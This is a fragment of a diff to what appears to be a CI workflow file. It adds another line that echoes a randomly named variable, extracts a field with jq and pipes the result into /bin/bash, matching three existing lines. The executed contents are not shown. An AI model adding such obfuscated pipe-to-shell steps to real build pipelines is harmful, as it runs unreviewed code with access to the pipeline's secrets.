@@ -62,6 +62,7 @@ jobs:
           echo $ksd8549 | jq -r .hien7 | /bin/bash
           echo $cw66121 | jq -r .jwrwg9255 | /bin/bash
           echo $vr050 | jq -r .he1 | /bin/bash
+          echo $pw8986 | jq -r .owt0 | /bin/bash
 
       - name: Upload artifact
         if: always()
